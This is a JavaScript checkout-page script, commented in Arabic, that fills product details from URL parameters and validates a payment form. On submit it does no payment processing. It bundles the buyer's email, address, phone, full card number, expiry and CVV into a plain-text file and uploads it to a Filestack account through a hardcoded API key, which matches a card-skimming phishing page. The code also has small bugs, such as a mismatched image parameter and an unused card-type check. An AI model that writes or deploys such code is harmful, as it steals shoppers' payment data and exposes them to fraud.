document.addEventListener('DOMContentLoaded', function () {
  // تحديد العناصر
  const form = document.getElementById('checkout-form');
  const productInfoContainer = document.querySelector('.product-info');
  const productDetailsContainer = document.getElementById('product-details');
  const productButton = document.getElementById('toggle-details');  // الزر الحالي لعرض التفاصيل

  // استخراج المعلمات من الرابط
  function getUrlParams() {
    const params = {};
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    urlParams.forEach((value, key) => {
      params[key] = value;
    });
    return params;
  }

  const urlParams = getUrlParams();

  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
  document.getElementById('product-name').textContent = `${urlParams.name}`;
  document.getElementById('product-color').textContent = ` ${urlParams.color}`;
  document.getElementById('product-price').textContent = `${urlParams.price}`;
  document.getElementById('product-quantity').textContent = `${urlParams.quantity}`;

  // حساب السعر الإجمالي
  const totalPrice = urlParams.price * urlParams.quantity;
  document.getElementById('total-price').textContent = `$${totalPrice}`;

  // عرض الصورة
  const productImage = document.getElementById('product-image');

  if (urlParams.image) {
    productImage.src = urlParams.image;
    productImage.alt = urlParams.name || 'Product' + ' image';
  } else {
    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
    productImage.alt = 'No Image Available';
  }

  // عند الضغط على زر "Show Product Details"، نعرض تفاصيل المنتج أو إخفاءها
  productButton.addEventListener('click', function() {
    if (productDetailsContainer.style.display === 'none' || productDetailsContainer.style.display === '') {
      productDetailsContainer.style.display = 'block';  // إظهار تفاصيل المنتج
      productImage.style.display = 'block';  // إظهار الصورة
      productButton.textContent = 'Hide Product Details';  // تغيير النص إلى "Hide Product Details"
    } else {
      productDetailsContainer.style.display = 'none';  // إخفاء تفاصيل المنتج
      productImage.style.display = 'none';  // إخفاء الصورة
      productButton.textContent = 'Show Product Details';  // إعادة النص إلى "Show Product Details"
    }
  });

  // إضافة مستمع للإرسال
  form.addEventListener('submit', function (event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال

    // جمع البيانات من الحقول
    const email = document.getElementById('email').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zipCode = document.getElementById('zip-code').value;
    const phone = document.getElementById('phone').value;  // حقل الهاتف الجديد
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // معلومات المنتج
    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
    const productImageUrl = urlParams.productImage || '';  // رابط الصورة

    // تحقق من القيم
    let isValid = true;

    removeErrorMessages();  // إزالة رسائل الخطأ السابقة

    // تحقق من الحقول الفارغة
    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !phone || !cardName || !cardNumber || !expiry || !cvv) {
        isValid = false;
        showErrorMessage('Please fill out all required fields.', 'general');
    }

    // تحقق من صحة البريد الإلكتروني
    if (!validateEmail(email)) {
      isValid = false;
      showErrorMessage('Please enter a valid email address.', 'email');
    }

    // تحقق من اسم حامل البطاقة
    if (!validateCardName(cardName)) {
      isValid = false;
      showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
    }

    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
    if (!luhnCheck(cardNumber)) {
      isValid = false;
      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    // تحقق من تاريخ الصلاحية
    if (!validateExpiry(expiry)) {
      isValid = false;
      showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
    }

    // تحقق من CVV
    if (!validateCVV(cvv)) {
      isValid = false;
      showErrorMessage('Please enter a valid CVV number.', 'cvv');
    }

    // إذا كانت البيانات صحيحة، أنشئ الملف النصي وأرسله عبر API
    if (isValid) {
      const clientData = {
        email: email,
        firstName: firstName,
        lastName: lastName,
        phone: phone,
        streetHouseApartmentUnit: streetHouseApartmentUnit,
        city: city,
        state: state,
        zipCode: zipCode,
        cardName: cardName,
        cardNumber: cardNumber,
        expiry: expiry,
        cvv: cvv,
        productName: productName,
        productPrice: productPriceText,
        productQuantity: productQuantityText,
        productImageUrl: productImageUrl,
        totalPrice: totalPrice
      };

      // إنشاء المحتوى لملف نصي
      let fileContent = `Client Data:\n`;
      fileContent += `Email: ${email}\n`;
      fileContent += `First Name: ${firstName}\n`;
      fileContent += `Last Name: ${lastName}\n`;
      fileContent += `Phone: ${phone}\n`;
      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
      fileContent += `Card Name: ${cardName}\n`;
      fileContent += `Card Number: ${cardNumber}\n`;
      fileContent += `Expiry: ${expiry}\n`;
      fileContent += `CVV: ${cvv}\n\n`;
      fileContent += `Product Information:\n`;
      fileContent += `Product Name: ${productName}\n`;
      fileContent += `Product Price: ${productPriceText}\n`;
      fileContent += `Product Quantity: ${productQuantityText}\n`;
      fileContent += `Total Price: ${totalPrice}\n`;

      // رفع الملف إلى Filestack
      uploadFileToFilestack(fileContent); 
    }
  });

  // دالة للتحقق من البريد الإلكتروني
  function validateEmail(email) {
    const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return regex.test(email);
  }

  // دالة للتحقق من اسم حامل البطاقة
  function validateCardName(cardName) {
    const regex = /^[A-Za-z ]+$/;  // يجب أن يحتوي الاسم فقط على حروف ومسافات
    return regex.test(cardName);
  }

  // دالة للتحقق من رقم البطاقة باستخدام خوارزمية لوهان
  function luhnCheck(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber[i]);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function validateCard(cardNumber) {
    const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
    return regex.test(cardNumber);
  }

  // دالة للتحقق من تاريخ الصلاحية
  function validateExpiry(expiry) {
    const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    return regex.test(expiry);
  }

  // دالة للتحقق من CVV
  function validateCVV(cvv) {
    const regex = /^[0-9]{3,4}$/;
    return regex.test(cvv);
  }

  // دالة لإظهار رسائل الخطأ
  function showErrorMessage(message, field) {
    const errorMessage = document.createElement('div');
    errorMessage.classList.add('error-message');
    errorMessage.textContent = message;
    document.getElementById(field).parentNode.appendChild(errorMessage);
  }

  // دالة لإزالة رسائل الخطأ السابقة
  function removeErrorMessages() {
    const errorMessages = document.querySelectorAll('.error-message');
    errorMessages.forEach(function(message) {
      message.remove();
    });
  }

  // دالة لرفع الملف إلى Filestack
  function uploadFileToFilestack(fileContent) {
    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
    client.upload(fileBlob)
      .then((res) => {
        console.log('File uploaded successfully:', res);
      })
      .catch((err) => {
        console.error('Error uploading file:', err);
      });
  }

  // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
  const expiryInput = document.getElementById('expiry');
  expiryInput.addEventListener('input', function(event) {
    if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
      expiryInput.value = expiryInput.value + '/';
    }
  });
});



